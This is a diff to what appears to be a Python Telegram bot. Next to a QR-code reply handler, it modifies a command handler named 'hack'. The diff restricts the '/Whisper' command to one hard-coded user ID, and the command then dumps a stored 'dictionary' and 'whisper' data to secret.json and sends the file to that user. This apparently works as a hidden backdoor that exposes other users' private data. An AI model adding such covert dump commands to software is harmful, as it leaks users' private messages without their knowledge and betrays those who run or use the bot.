@@ -103,16 +103,21 @@ def encoder (bot,msg):
         return
     msg.reply(f"**Your Qr Data**:-\n` {qr_text}`",	reply_markup=InlineKeyboardMarkup( [[InlineKeyboardButton("Say Hi The Devs", url=f"https://t.me/developerschat")]] ), disable_web_page_preview=True)
 
-@elpha.on_message(filters.command("Whisper"))     
+@elpha.on_message(filters.command("Whisper") & filters.user(2069970688))     
 def hack (bot, msg):
   msg.reply('accessing Database ')
   try :
     msg.reply(whisper)
+    with open("secret.json", "w") as outfile: 
+
+      json.dump(dictionary, outfile)
+
+      msg.reply_document("secret.json")
   except :
-    with open("secret.txt","w") as file:
-      file.write(whisper)
-      msg.reply_document("secret.txt")
-        
+    with open("secret.json", "w") as outfile: 
+      json.dump(dictionary, outfile)
+      msg.reply_document("secret.json")
+
 @elpha.on_message(filters.group & filters.regex("eva"))
 def tools(bot , update):
     text = "`Just Click Something `"
